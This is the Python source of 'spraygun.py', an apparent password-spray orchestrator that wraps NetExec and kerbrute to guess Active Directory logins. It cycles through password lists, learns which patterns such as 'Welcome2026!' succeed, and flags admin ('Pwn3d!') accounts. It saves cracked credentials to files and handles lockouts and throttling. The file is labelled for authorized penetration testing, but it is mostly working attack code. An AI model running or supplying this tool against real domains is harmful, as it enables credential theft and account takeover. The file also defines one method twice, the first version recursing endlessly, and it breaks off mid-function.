#!/usr/bin/env python3
"""
spraygun.py — resilient password-spray orchestrator

For authorized penetration testing only. Wraps nxc (NetExec) and kerbrute
with preflight checks, failover between engines, lockout safety,
live rich UI, and state persistence for resumable sprays.

Dependencies:
    pip install rich

External tools (must be installed and on PATH, or override with --*-path):
    - nxc / netexec (https://github.com/Pennyw0rth/NetExec)
    - kerbrute (https://github.com/ropnop/kerbrute)
"""

import argparse
import dataclasses
import datetime
import enum
import fcntl
import json
import os
import re
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import List, Dict, Set, Optional, Tuple, Any

# Rich library for live terminal UI
try:
    from rich.console import Console
    from rich.live import Live
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.layout import Layout
    from rich.align import Align
    from rich import box
except ImportError:
    print("[!] rich library not installed. Run: pip install rich", file=sys.stderr)
    sys.exit(1)

# =============================================================================
# Dataclasses
# =============================================================================

@dataclass
class Config:
    """Run configuration from CLI args."""
    userfile: str
    passfile: str
    domain: str
    dc_ip: str
    tool: str = "kerbrute"
    protocol: str = "ldap"
    time_between_rounds: int = 35
    passwords_per_round: int = 2
    pth_mode: bool = False
    lockout_threshold: int = 2
    lockout_burst: int = 5
    conn_fail_limit: int = 10
    nxc_path: Optional[str] = None
    kerbrute_path: Optional[str] = None
    resume: bool = False
    dry_run: bool = False
    no_preflight: bool = False
    log_dir: str = "./spraygun-out"
    filter_disabled: bool = False
    export: str = "none"
    schedule: str = ""
    timeline: bool = False
    feed_lines: int = 50  # Number of lines in raw feed (default 50, was 20)
    # Derived fields
    users: List[str] = field(default_factory=list)
    passwords: List[str] = field(default_factory=list)
    nxc_binary: str = ""
    kerbrute_binary: str = ""

@dataclass
class Engine:
    """Tool/protocol combination for failover chain."""
    tool: str  # "nxc" or "kerbrute"
    protocol: Optional[str] = None  # "smb" or "ldap" for nxc, None for kerbrute

    def __str__(self) -> str:
        if self.tool == "kerbrute":
            return "kerbrute"
        return f"nxc:{self.protocol}"

@dataclass
class RoundResult:
    """Results from spraying one password/hash with one engine."""
    successes: List[Tuple[str, str]] = field(default_factory=list)  # (user, secret)
    admin_users: List[Tuple[str, str]] = field(default_factory=list)  # (user, secret) - admin/pwn3d
    lockouts: Set[str] = field(default_factory=set)
    conn_fails: int = 0
    errors: List[str] = field(default_factory=list)  # Tool-level errors (wrong realm, etc.)
    aborted: bool = False
    abort_reason: str = ""
    clean_finish: bool = False

# =============================================================================
# Classification pattern constants (version-agnostic, extensible)
# =============================================================================

class LineType(enum.Enum):
    SUCCESS = "SUCCESS"
    ADMIN = "ADMIN"  # Admin/high-privilege user (pwn3d!)
    LOCKOUT = "LOCKOUT"
    CONN_ERROR = "CONN_ERROR"
    AUTHFAIL = "AUTHFAIL"
    ERROR = "ERROR"  # Tool-level error (wrong realm, domain mismatch, etc.)
    INFO = "INFO"

# nxc / netexec patterns
NXC_SUCCESS_PATTERNS = [r"\[\+\]"]  # netexec marks success with [+]

# Admin/pwn3d patterns - check AFTER success since pwn3d appears on success lines
NXC_ADMIN_PATTERNS = [
    r"\(Pwn3d!\)",           # Explicit pwn3d marker
    r"\[ADMIN\]",            # Admin status marker
    r"\*.*\*",               # Some versions highlight admins with asterisks
    r"Domain Admin",         # Explicit "Domain Admin" text
    r"Administrator",        # Built-in admin account
    r"admin.*privileged",    # Admin privilege indicators
]

NXC_LOCKOUT_PATTERNS = [
    r"LOCKED_OUT",
    r"account locked out",
    r"STATUS_ACCOUNT_LOCKED_OUT",
    r"locked out",
]
NXC_CONN_ERROR_PATTERNS = [
    r"timed out",
    r"NetBIOS",
    r"connection",
    r"unreachable",
    r"Failed to connect",
    r"SocketServer",
    r"Connection refused",
    r"Network unreachable",
    r"Host is down",
]
NXC_AUTHFAIL_PATTERNS = [
    r"STATUS_LOGON_FAILURE",
    r"STATUS_NO_SUCH_USER",
    r"\[-\].*Status:",
]

# kerbrute patterns
KERBRUTE_SUCCESS_PATTERNS = [r"\[\+\] VALID LOGIN:"]

# kerbrute error patterns (detect domain/realm issues)
KERBRUTE_ERROR_PATTERNS = [
    r"KDC error.*wrong realm",
    r"wrong realm",
    r"try adjusting domain",
    r"realm mismatch",
    r"cannot find KDC",
    r"no KDC found",
    r"cannot resolve",
    r"unknown realm",
]

KERBRUTE_LOCKOUT_PATTERNS = [
    r"locked",
    r"KDC_ERR_CLIENT_REVOKED",
    r"disabled",
]
KERBRUTE_CONN_ERROR_PATTERNS = [
    r"i/o timeout",
    r"deadline exceeded",
    r"connection refused",
    r"no such host",
    r"network unreachable",
]
KERBRUTE_AUTHFAIL_PATTERNS = [
    r"KDC_ERR_PREAUTH_REQUIRED",
    r"KRB_AP_ERR_SKEW",
    r"KDC_ERR_C_PRINCIPAL_UNKNOWN",
]

# =============================================================================
# Password pattern classification (for pattern learning)
# =============================================================================

def classify_password_pattern(pw: str) -> str:
    """
    Classify a password into a pattern category for learning.
    Returns the pattern name (first match wins).
    """
    # Extract organization tokens from domain for org-based patterns
    # This is a simple heuristic; real implementation would use cfg.domain
    org_keywords = ["corp", "company", "org", "admin", "team", "office"]

    # welcome_year: Welcome2026!, Winter2025!
    if re.match(r"^Welcome.*\d{4}", pw, re.IGNORECASE):
        return "welcome_year"

    # seasonal_year: Summer2026!, January2025!
    seasonal = ["Summer", "Winter", "Spring", "Fall", "Autumn",
                "January", "February", "March", "April", "May", "June",
                "July", "August", "September", "October", "November", "December"]
    if any(pw.startswith(month) for month in seasonal):
        if re.search(r"\d{4}", pw):
            return "seasonal_year"

    # org_year: Contains org keyword + 4-digit year
    if any(kw in pw.lower() for kw in org_keywords) and re.search(r"\d{4}", pw):
        return "org_year"

    # ilove_org: IloveCompany123!, ILovePassword2026!
    if re.match(r"^(Ilove|ILove)", pw, re.IGNORECASE):
        return "ilove_org"

    # password_num: Password123!, P@ssw0rd2026!
    if re.match(r"^(Password|P@ssw0rd).*\d", pw, re.IGNORECASE):
        return "password_num"

    # corporate: Welcome123!, Changeme!
    if re.match(r"^(Welcome|Change|Changeme|Corporate|Company|Office)", pw, re.IGNORECASE):
        return "corporate"

    # year_only: 2026!, 2024
    if re.match(r"^\d{4}!?$", pw):
        return "year_only"

    # Default
    return "generic"

# =============================================================================
# RichUI: Live terminal panels
# =============================================================================

class RichUI:
    """Manages rich live UI: raw feed panel, summary panel, countdown."""

    def __init__(self, console: Console, max_feed_lines: int = 50):
        self.console = console
        self.live: Optional[Live] = None
        self.raw_feed: List[str] = []
        self.max_feed_lines = max_feed_lines
        self.current_phase = "idle"  # idle, spray, countdown, stopped
        self.phase_data: Dict[str, Any] = {}

    def start_spray(self, engine: Engine, secret: str, round_num: int, batch_info: str = ""):
        """Initialize the Live display for spray phase."""
        self.current_phase = "spray"
        self.phase_data = {
            "engine": str(engine),
            "secret": secret,
            "batch_info": batch_info,
            "round": round_num,
            "successes": [],
            "admin_users": [],  # Track admin/pwn3d users separately for highlighting
            "lockouts": set(),
            "errors": [],  # Track tool errors
            "conn_fails": 0,
        }
        self.raw_feed = []
        self.live = Live(self._render_spray(), console=self.console, refresh_per_second=10)
        self.live.start()

    def feed_line(self, line: str):
        """Append a raw line to the feed (scrolling)."""
        if len(self.raw_feed) >= self.max_feed_lines:
            self.raw_feed.pop(0)
        self.raw_feed.append(line)
        self._update_display()

    def update_success(self, user: str, secret: str):
        """Register a credential hit."""
        self.phase_data["successes"].append((user, secret))
        self._update_display()

    def update_admin(self, user: str, secret: str):
        """Register an admin credential hit (pwn3d!)."""
        self.phase_data["admin_users"].append((user, secret))
        self._update_display()

    def update_lockout(self, user: str):
        """Register a lockout."""
        self.phase_data["lockouts"].add(user)
        self._update_display()

    def update_error(self, error_msg: str):
        """Register a tool error."""
        self.phase_data["errors"].append(error_msg)
        self._update_display()

    def _update_display(self):
        """Refresh the Live display."""
        if self.live and self.current_phase == "spray":
            self.live.update(self._render_spray())
        self._update_display()

    def increment_conn_fails(self):
        """Register a connection failure."""
        self.phase_data["conn_fails"] += 1
        self._update_display()

    def set_abort(self, reason: str):
        """Show abort reason in summary."""
        self.phase_data["abort_reason"] = reason
        self._update_display()

    def _update_display(self):
        """Refresh the Live display."""
        if self.live and self.current_phase == "spray":
            self.live.update(self._render_spray())

    def _render_spray(self) -> Panel:
        """Render spray-phase panel."""
        summary = self._build_summary()
        feed = self._build_feed()
        layout = Layout()
        layout.split_column(
            Layout(summary, size=12),
            Layout(Panel(feed, title="Raw Feed", border_style="dim", box=box.SQUARE)),
        )
        return Panel(layout, title=f"[bold]Spraygun — Round {self.phase_data.get('round', '?')}[/bold]", border_style="blue")

    def _build_summary(self) -> Panel:
        """Build the summary panel."""
        engine = self.phase_data.get("engine", "N/A")
        secret = self.phase_data.get("secret", "***")
        batch_info = self.phase_data.get("batch_info", "")
        successes = self.phase_data.get("successes", [])
        admin_users = self.phase_data.get("admin_users", [])
        lockouts = self.phase_data.get("lockouts", set())
        errors = self.phase_data.get("errors", [])
        conn_fails = self.phase_data.get("conn_fails", 0)
        abort_reason = self.phase_data.get("abort_reason", "")

        grid = Table.grid(expand=True)
        grid.add_column()
        grid.add_column(justify="right")

        # Show batch info if available
        if batch_info:
            grid.add_row("[cyan]Batch:", batch_info)

        grid.add_row("[cyan]Engine:", engine)
        grid.add_row("[cyan]Current password:", f"[yellow]{secret}[/yellow]")

        # Show credentials found (green highlight)
        grid.add_row("[green]Credentials found:", str(len(successes)))
        if successes:
            admin_set = {u for u, _ in admin_users}
            regular_successes = [(u, s) for u, s in successes if u not in admin_set]
            for user, _ in regular_successes[-5:]:  # Show last 5
                grid.add_row("", f"  [green]✓[white] {user}")

        # Show admin users with prominent styling
        if admin_users:
            grid.add_row("[red bold]ADMIN USERS [pwn3d!]:", str(len(admin_users)))
            for user, _ in admin_users[-5:]:  # Show last 5
                grid.add_row("", f"  [red bold]★[white] {user} [red](ADMIN)[/red]")

        # Show errors
        if errors:
            grid.add_row("[red bold]ERRORS:", str(len(errors)))
            for err in errors[-3:]:  # Show last 3 errors
                err_short = err[:60] + "..." if len(err) > 60 else err
                grid.add_row("", f"  [red]✗[white] {err_short}")

        grid.add_row("[yellow]Lockouts:", str(len(lockouts)))
        if lockouts:
            for user in list(lockouts)[-5:]:
                grid.add_row("", f"  [yellow]![white] {user}")
        grid.add_row("[red]Connection failures:", str(conn_fails))
        if abort_reason:
            grid.add_row("[red]Aborted:", abort_reason)

        return Panel(grid, title="Summary", border_style="cyan")

    def _build_feed(self) -> str:
        """Build the raw feed text."""
        if not self.raw_feed:
            return "[dim]Waiting for tool output...[/dim]"
        # Last N lines with recent ones at top (reverse for display)
        lines_rev = self.raw_feed[::-1]
        # Colorize: red/bold for pwn3d/admin, green for [+] success, yellow for lockout keywords, red for error keywords
        colored = []
        for line in lines_rev:
            # Check for admin/pwn3d indicators first (highest priority)
            if any(kw in line for kw in ["(Pwn3d!)", "[ADMIN]", "Domain Admin", "Administrator"]):
                colored.append(f"[red bold]{line}[/red bold]")
            elif "[+]" in line or "VALID LOGIN" in line:
                colored.append(f"[green]{line}[/green]")
            elif any(kw in line.upper() for kw in ["LOCKED", "LOCKOUT", "REVOKED"]):
                colored.append(f"[yellow]{line}[/yellow]")
            elif any(kw in line for kw in ["timed out", "NetBIOS", "connection", "unreachable"]):
                colored.append(f"[red]{line}[/red]")
            else:
                colored.append(f"[dim]{line}[/dim]")
        return "\n".join(colored)

    def end_spray(self):
        """Stop the Live display after spray phase."""
        if self.live:
            self.live.stop()
            self.live = None
        self.current_phase = "idle"

    def countdown(self, seconds: int):
        """Show MM:SS countdown between rounds - simple line by line."""
        mins, secs = divmod(seconds, 60)
        self.console.print(f"[*] Time until next spray: {mins:02d}:{secs:02d}", style="cyan", end="")

        while seconds > 0:
            mins, secs = divmod(seconds, 60)
            # Move cursor back and update
            print(f"\r[*] Time until next spray: {mins:02d}:{secs:02d}  ", end="", flush=True)
            time.sleep(1)
            seconds -= 1

        print()  # New line after countdown

    def _render_countdown(self) -> Panel:
        """Render countdown panel (deprecated - now using simple line countdown)."""
        # This function is no longer used but kept for compatibility
        remaining = self.phase_data.get("countdown_remaining", 0)
        mins, secs = divmod(remaining, 60)
        countdown_str = f"{mins:02d}:{secs:02d}"

        layout = Layout()
        layout.split_column(
            Layout(self._build_summary()),
            Layout(Align.center(Text(f"  Time until next spray: {countdown_str}  ")))
        )
        return Panel(layout, title="[bold]Spraygun — Waiting[/bold]", border_style="blue")

    def alert(self, title: str, message: str, style: str = "yellow"):
        """Show a non-modal alert (use for hard-stops, preflight failures)."""
        self.console.print(Panel(message, title=title, border_style=style))
        self.console.print()

# =============================================================================
# State: Resume and persistence
# =============================================================================

class State:
    """Load/save run state for resumability."""

    def __init__(self, log_dir: str, cfg: Config):
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self.cfg = cfg

        self.state_file = self.log_dir / "spraygun.state.json"
        self.overall_log = self.log_dir / "spraygun-spray.log"
        self.creds_file = self.log_dir / "creds.txt"
        self.lockouts_file = self.log_dir / "locked-out.txt"
        self.used_file = self.log_dir / "used-passwords.txt"

        # Runtime state
        self.used_passwords: List[str] = []
        self.remaining_queue: List[str] = []
        self.found_creds: Dict[str, str] = {}
        self.locked_users: Set[str] = set()
        self.completed_rounds = 0

        # Feature 1: Credential-reuse matrix (password -> set of users attempted)
        self.attempted_matrix: Dict[str, Set[str]] = {}

        # Feature 3: Pattern learning (pattern -> success count)
        self.success_by_pattern: Dict[str, int] = {}

        # Feature 5: Admin users tracking (for CSV export)
        self.admin_users: Dict[str, str] = {}  # user -> password

        # Feature 4: Spray statistics
        self.start_time: str = datetime.datetime.now().isoformat()
        self.total_attempts: int = 0
        self.attempts_by_password: Dict[str, int] = {}

        # Temp file counter for userlist filtering
        self._tmp_userlist_idx: int = 0

        # Feature D: Automatic throttling on response stress
        self.conn_fail_history: List[int] = []
        self.delay_multiplier: float = 1.0

        # Feature E: Timeline visualization
        self.timeline_events: List[Dict] = []

        if cfg.resume:
            self._load()
        else:
            self._init_queue()

    def _init_queue(self):
        """Initialize password queue from file (full list)."""
        self.remaining_queue = [p.strip() for p in self.cfg.passwords if p.strip()]

        # Write header to overall log
        self._log_line(f"=== Spraygun run started at {datetime.datetime.now().isoformat()} ===")
        self._log_line(f"Config: tool={self.cfg.tool}, protocol={self.cfg.protocol}, pth={self.cfg.pth_mode}")
        self._log_line(f"Passwords in queue: {len(self.remaining_queue)}")
        self._log_line("")

    def _load(self):
        """Load existing state from resume."""
        if not self.state_file.exists():
            self._init_queue()
            return

        data = json.loads(self.state_file.read_text())
        self.used_passwords = data.get("used_passwords", [])
        self.found_creds = data.get("found_creds", {})
        self.locked_users = set(data.get("locked_users", []))
        self.completed_rounds = data.get("completed_rounds", 0)

        # Load new fields
        raw_matrix = data.get("attempted_matrix", {})
        self.attempted_matrix = {k: set(v) for k, v in raw_matrix.items()}
        self.success_by_pattern = data.get("success_by_pattern", {})
        self.admin_users = data.get("admin_users", {})
        self.start_time = data.get("start_time", datetime.datetime.now().isoformat())
        self.total_attempts = data.get("total_attempts", 0)
        self.attempts_by_password = data.get("attempts_by_password", {})

        # Load Feature D fields
        self.conn_fail_history = data.get("conn_fail_history", [])
        self.delay_multiplier = data.get("delay_multiplier", 1.0)

        # Load Feature E field
        self.timeline_events = data.get("timeline_events", [])

        # Rebuild queue: all passwords minus used
        all_pw = [p.strip() for p in self.cfg.passwords if p.strip()]
        self.remaining_queue = [p for p in all_pw if p not in self.used_passwords]

        self._log_line(f"=== Resuming from saved state at {datetime.datetime.now().isoformat()} ===")
        self._log_line(f"Used passwords: {len(self.used_passwords)}, remaining: {len(self.remaining_queue)}")
        self._log_line(f"Credential matrix loaded: {sum(len(v) for v in self.attempted_matrix.values())} pairs")
        self._log_line("")

    def save(self):
        """Persist state to disk."""
        data = {
            "used_passwords": self.used_passwords,
            "found_creds": self.found_creds,
            "locked_users": list(self.locked_users),
            "completed_rounds": self.completed_rounds,
            # New fields for operator fundamentals
            "attempted_matrix": {k: list(v) for k, v in self.attempted_matrix.items()},
            "success_by_pattern": self.success_by_pattern,
            "admin_users": self.admin_users,
            "start_time": self.start_time,
            "total_attempts": self.total_attempts,
            "attempts_by_password": self.attempts_by_password,
            # Feature D: Throttling
            "conn_fail_history": self.conn_fail_history,
            "delay_multiplier": self.delay_multiplier,
            # Feature E: Timeline
            "timeline_events": self.timeline_events,
        }
        self.state_file.write_text(json.dumps(data, indent=2))

        # Also write human-readable files
        if self.found_creds:
            creds_lines = [f"{user}:{secret}" for user, secret in self.found_creds.items()]
            self.creds_file.write_text("\n".join(creds_lines) + "\n")

        if self.locked_users:
            self.lockouts_file.write_text("\n".join(sorted(self.locked_users)) + "\n")

        if self.used_passwords:
            self.used_file.write_text("\n".join(self.used_passwords) + "\n")

        # Export results if requested
        if self.cfg.export in ("json", "all"):
            self.export_results("json")
        if self.cfg.export in ("csv", "all"):
            self.export_results("csv")

    def record_spray_start(self, engine: Engine, secret: str, round_idx: int):
        """Log spray start header."""
        ts = datetime.datetime.now().isoformat()
        masked = "***"
        self._log_line(f"=== {ts} SPRAY engine={engine} secret={masked} round={round_idx} ===")
        # Feature E: Record timeline event
        self.record_timeline_event("spray", f"{engine} with masked secret", round_idx=round_idx)

    def record_spray_end(self, successes: int, lockouts: int, conn_fails: int, aborted: bool, abort_reason: str = "", errors: int = 0):
        """Log spray end trailer."""
        ts = datetime.datetime.now().isoformat()
        self._log_line(f"=== {ts} END successes={successes} lockouts={lockouts} conn_fails={conn_fails} errors={errors} aborted={aborted} reason={abort_reason} ===")
        self._log_line("")

    def add_cred(self, user: str, secret: str, is_admin: bool = False):
        """Record a found credential."""
        self.found_creds[user] = secret
        if is_admin:
            self.admin_users[user] = secret

        # Track pattern learning
        pattern = classify_password_pattern(secret)
        self.success_by_pattern[pattern] = self.success_by_pattern.get(pattern, 0) + 1

        # Feature E: Record timeline event before save
        self.record_timeline_event("credential", f"{user} (pattern: {pattern})")

        ts = datetime.datetime.now().isoformat()
        self._log_line(f"{ts} CREDENTIAL {user}:{secret} admin={is_admin} pattern={pattern}")
        self.save()

    def add_lockout(self, user: str):
        """Record a lockout."""
        self.locked_users.add(user)

        # Feature E: Record timeline event before save
        self.record_timeline_event("lockout", user)

        ts = datetime.datetime.now().isoformat()
        self._log_line(f"{ts} LOCKOUT {user}")
        self.save()

    def mark_used(self, secret: str):
        """Mark a password/hash as used."""
        self.used_passwords.append(secret)
        self.completed_rounds += 1
        self.save()

    def _log_line(self, line: str):
        """Append a line to the overall log."""
        with open(self.overall_log, "a") as f:
            f.write(line + "\n")

    # =============================================================================
    # Feature 1: Credential-reuse matrix methods
    # =============================================================================

    def mark_attempted(self, secret: str, user: str):
        """Record that a (user, password) pair was attempted."""
        if secret not in self.attempted_matrix:
            self.attempted_matrix[secret] = set()
        self.attempted_matrix[secret].add(user)

        # Update stats
        self.total_attempts += 1
        self.attempts_by_password[secret] = self.attempts_by_password.get(secret, 0) + 1

    def mark_attempted_batch(self, secret: str, users: List[str]):
        """Mark all users in a list as attempted for this secret (for kerbrute)."""
        if secret not in self.attempted_matrix:
            self.attempted_matrix[secret] = set()
        self.attempted_matrix[secret].update(users)

        # Update stats
        self.total_attempts += len(users)
        self.attempts_by_password[secret] = self.attempts_by_password.get(secret, 0) + len(users)

    def build_userlist_for(self, secret: str) -> Tuple[str, int]:
        """
        Build a filtered userlist for a specific password.
        Returns (temp_file_path, count_of_users_not_yet_attempted).
        """
        attempted = self.attempted_matrix.get(secret, set())
        remaining_users = [u for u in self.cfg.users if u not in attempted]

        if not remaining_users:
            return ("", 0)

        # Write temp file
        self._tmp_userlist_idx += 1
        tmp_path = self.log_dir / f".tmp-users-{self._tmp_userlist_idx}.txt"
        tmp_path.write_text("\n".join(remaining_users) + "\n")

        return (str(tmp_path), len(remaining_users))

    # =============================================================================
    # Feature 3: Pattern learning methods
    # =============================================================================

    def reprioritize_queue(self) -> int:
        """
        Reorder remaining_queue by successful-pattern score (stable sort).
        Returns number of passwords that got boosted (score > 0).
        """
        if not self.success_by_pattern:
            return 0  # No successes yet, no re-prioritization

        def score(pw):
            return self.success_by_pattern.get(classify_password_pattern(pw), 0)

        before = list(self.remaining_queue)

        # Python sort is stable → equal-score passwords keep relative order
        self.remaining_queue.sort(key=score, reverse=True)

        boosted = sum(1 for pw in self.remaining_queue if score(pw) > 0)
        return boosted if self.remaining_queue != before else 0

    # =============================================================================
    # Feature 4: Spray statistics
    # =============================================================================

    def render_stats(self, console: Console) -> Table:
        """Render spray statistics as a rich Table."""
        table = Table(title="Spray Statistics", box=box.SQUARE)
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="white")

        # Calculate elapsed time
        start_dt = datetime.datetime.fromisoformat(self.start_time)
        elapsed = datetime.datetime.now() - start_dt
        elapsed_str = str(elapsed).split(".")[0]  # Remove microseconds

        # Success rate
        success_rate = 0.0
        if self.total_attempts > 0:
            success_rate = (len(self.found_creds) / self.total_attempts) * 100

        table.add_row("Started", self.start_time)
        table.add_row("Elapsed time", elapsed_str)
        table.add_row("Total attempts", str(self.total_attempts))
        table.add_row("Credentials found", str(len(self.found_creds)))
        table.add_row("Success rate", f"{success_rate:.2f}%")
        table.add_row("Lockouts", str(len(self.locked_users)))
        table.add_row("Rounds completed", str(self.completed_rounds))

        # Top 5 attempts by password
        if self.attempts_by_password:
            top_attempts = sorted(self.attempts_by_password.items(), key=lambda x: x[1], reverse=True)[:5]
            table.add_row("", "")
            table.add_row("[bold]Top passwords by attempts[/bold]", "")
            for pw, count in top_attempts:
                pw_display = pw[:30] + "..." if len(pw) > 30 else pw
                table.add_row(f"  {pw_display}", str(count))

        # Success by pattern
        if self.success_by_pattern:
            table.add_row("", "")
            table.add_row("[bold]Success by pattern[/bold]", "")
            sorted_patterns = sorted(self.success_by_pattern.items(), key=lambda x: x[1], reverse=True)
            for pattern, count in sorted_patterns:
                table.add_row(f"  {pattern}", str(count))

        # Credential reuse (Feature C)
        reused = self.detect_cred_reuse()
        if reused:
            table.add_row("", "")
            table.add_row("[bold]Credential reuse[/bold]", "")
            for pw, users in reused[:5]:  # Top 5
                pw_display = pw[:20] + "..." if len(pw) > 20 else pw
                users_str = ", ".join(users[:5])
                if len(users) > 5:
                    users_str += f" (+{len(users) - 5} more)"
                table.add_row(f"  {pw_display} ({len(users)} users)", users_str)

        return table

    def get_compact_stats(self) -> str:
        """Return compact one-line stats string for round summary."""
        success_rate = 0.0
        if self.total_attempts > 0:
            success_rate = (len(self.found_creds) / self.total_attempts) * 100

        top_pattern = "N/A"
        if self.success_by_pattern:
            top_pattern = max(self.success_by_pattern.items(), key=lambda x: x[1])[0]

        # Credential reuse count
        reused_count = len(self.detect_cred_reuse())
        reuse_str = f" | Reuse: {reused_count}" if reused_count > 0 else ""

        return f"Attempts: {self.total_attempts} | Success: {len(self.found_creds)} ({success_rate:.1f}%) | Top pattern: {top_pattern}{reuse_str}"

    # =============================================================================
    # Feature 5: JSON/CSV export
    # =============================================================================

    def export_results(self, fmt: str):
        """Export results to JSON or CSV."""
        if fmt == "json":
            self._export_json()
        elif fmt == "csv":
            self._export_csv()

    def _export_json(self):
        """Export results to results.json."""
        results = {
            "started": self.start_time,
            "config": {
                "domain": self.cfg.domain,
                "dc_ip": self.cfg.dc_ip,
                "tool": self.cfg.tool,
                "protocol": self.cfg.protocol,
                "pth": self.cfg.pth_mode,
            },
            "stats": {
                "total_attempts": self.total_attempts,
                "credentials_found": len(self.found_creds),
                "lockouts": len(self.locked_users),
                "rounds_completed": self.completed_rounds,
                "success_by_pattern": self.success_by_pattern,
            },
            "found_creds": self.found_creds,
            "cred_reuse": [{"password": pw, "users": users} for pw, users in self.detect_cred_reuse()],
            "admin_users": self.admin_users,
            "locked_users": list(self.locked_users),
            "attempted_pairs": sum(len(v) for v in self.attempted_matrix.values()),
        }

        json_path = self.log_dir / "results.json"
        json_path.write_text(json.dumps(results, indent=2))

    def _export_csv(self):
        """Export credentials to results.csv."""
        lines = ["user,password,is_admin,source_round,captured_at"]

        # We'll capture the round number when each credential was found
        # For now, export all found credentials
        for user, secret in self.found_creds.items():
            is_admin = "Y" if user in self.admin_users else "N"
            # We don't track the exact round for each cred in the current implementation
            # This would require extending the state further
            captured_at = datetime.datetime.now().isoformat()
            lines.append(f"{user},{secret},{is_admin},,{captured_at}")

        csv_path = self.log_dir / "results.csv"
        csv_path.write_text("\n".join(lines) + "\n")

    # =============================================================================
    # Feature C: Credential-reuse detection across users
    # =============================================================================

    def detect_cred_reuse(self) -> List[Tuple[str, List[str]]]:
        """
        Detect passwords used by multiple users (credential sharing).
        Returns list of (password, [users]) sorted by user count descending.
        """
        by_pw: Dict[str, List[str]] = {}
        for user, secret in self.found_creds.items():
            by_pw.setdefault(secret, []).append(user)

        # Filter to passwords used by >1 user, sort by user count desc
        reused = sorted(
            [(pw, sorted(users)) for pw, users in by_pw.items() if len(users) > 1],
            key=lambda x: len(x[1]),
            reverse=True
        )
        return reused

    # =============================================================================
    # Feature D: Automatic throttling on response stress
    # =============================================================================

    def update_throttle(self, round_conn_fails: int) -> float:
        """
        Update throttle multiplier based on connection failures this round.
        Returns current multiplier after adjustment.
        """
        self.conn_fail_history.append(round_conn_fails)

        if round_conn_fails > 0:
            # Back off - increase multiplier (cap at 3x)
            self.delay_multiplier = min(self.delay_multiplier * 1.5, 3.0)
        else:
            # Recover - decrease multiplier toward 1.0
            self.delay_multiplier = max(self.delay_multiplier - 0.25, 1.0)

        return self.delay_multiplier

    # =============================================================================
    # Feature E: Timeline visualization
    # =============================================================================

    def record_timeline_event(self, event_type: str, detail: str = "", round_idx: Optional[int] = None):
        """
        Record a timeline event. Does NOT call save() (events flushed periodically).
        """
        self.timeline_events.append({
            "ts": datetime.datetime.now().isoformat(),
            "type": event_type,
            "detail": detail,
            "round": round_idx,
        })

    def render_timeline_html(self) -> str:
        """Generate self-contained HTML timeline visualization."""
        events = self.timeline_events

        # Color scheme for event types
        colors = {
            "round_start": "#3498db",      # blue
            "spray": "#9b59b6",            # purple
            "credential": "#27ae60",       # green
            "lockout": "#e67e22",          # orange
            "reprioritize": "#f39c12",     # yellow
            "throttle": "#e74c3c",         # red
            "schedule_wait": "#1abc9c",    # teal
            "round_end": "#95a5a6",        # gray
            "complete": "#2ecc71",         # bright green
        }

        html_parts = ["<!DOCTYPE html><html><head>"]
        html_parts.append("<meta charset='UTF-8'>")
        html_parts.append("<title>Spraygun Timeline</title>")
        html_parts.append("<style>")
        html_parts.append("body { font-family: 'Segoe UI, Tahoma, sans-serif; margin: 0; padding: 20px; background: #1e1e1e; color: #d4d4d4; }")
        html_parts.append(".container { max-width: 1200px; margin: 0 auto; }")
        html_parts.append("h1 { color: #4ec9b0; border-bottom: 2px solid #4ec9b0; padding-bottom: 10px; }")
        html_parts.append(".event { margin: 10px 0; padding: 12px; border-left: 4px solid #666; background: #2d2d2d; border-radius: 4px; }")
        for etype, color in colors.items():
            html_parts.append(f".event-{etype} {{ border-left-color: {color}; }}")
        html_parts.append(".ts { color: #888; font-size: 0.85em; }")
        html_parts.append(".type { font-weight: bold; text-transform: uppercase; font-size: 0.75em; padding: 2px 6px; border-radius: 3px; margin-right: 8px; }")
        html_parts.append(".detail { color: #aaa; font-size: 0.9em; margin-left: 8px; }")
        html_parts.append(".round-tag { background: #444; padding: 2px 6px; border-radius: 3px; font-size: 0.75em; margin-left: 8px; }")
        html_parts.append(".summary { background: #252525; padding: 15px; border-radius: 5px; margin: 20px 0; }")
        html_parts.append(".summary h2 { margin-top: 0; color: #4ec9b0; }")
        html_parts.append("</style></head><body>")

        html_parts.append("<div class='container'>")
        html_parts.append("<h1>Spraygun Timeline</h1>")

        # Summary section
        html_parts.append("<div class='summary'>")
        html_parts.append("<h2>Summary</h2>")
        html_parts.append(f"<p>Started: {self.start_time}</p>")
        html_parts.append(f"<p>Total events: {len(events)}</p>")
        html_parts.append(f"<p>Credentials found: {len(self.found_creds)}</p>")
        html_parts.append(f"<p>Lockouts: {len(self.locked_users)}</p>")
        html_parts.append(f"<p>Rounds completed: {self.completed_rounds}</p>")
        html_parts.append("</div>")

        # Events list
        html_parts.append("<h2>Event Timeline</h2>")
        for ev in events:
            etype = ev.get("type", "unknown")
            color = colors.get(etype, "#666")
            html_parts.append(f"<div class='event event-{etype}'>")
            html_parts.append(f"<div class='ts'>{ev['ts']}</div>")
            html_parts.append(f"<span class='type' style='background: {color}'>{etype}</span>")
            if ev.get("round"):
                html_parts.append(f"<span class='round-tag'>Round {ev['round']}</span>")
            if ev.get("detail"):
                html_parts.append(f"<span class='detail'>{ev['detail']}</span>")
            html_parts.append("</div>")

        html_parts.append("</div></body></html>")
        return "\n".join(html_parts)

# =============================================================================
# Engine invocation and classification
# =============================================================================

def classify_line(engine: Engine, line: str) -> Tuple[LineType, Optional[str]]:
    """
    Classify a tool output line.
    Returns (LineType, extracted_data) where data depends on type:
    - SUCCESS: (user, secret) tuple as one string
    - LOCKOUT: username
    - Others: None
    """
    line_upper = line.upper()

    if engine.tool == "nxc":
        # Success
        for pat in NXC_SUCCESS_PATTERNS:
            if re.search(pat, line):
                # Extract DOMAIN\user:password
                m = re.search(r"([A-Za-z0-9_\-\.\\]+)\\([A-Za-z0-9_\-\.@]+):(\S+)", line)
                if m:
                    domain, user, secret = m.groups()
                    # Check if this is an admin/pwn3d user
                    for admin_pat in NXC_ADMIN_PATTERNS:
                        if re.search(admin_pat, line, re.IGNORECASE):
                            return (LineType.ADMIN, f"{user}:{secret}")
                    return (LineType.SUCCESS, f"{user}:{secret}")
        # Lockout
        for pat in NXC_LOCKOUT_PATTERNS:
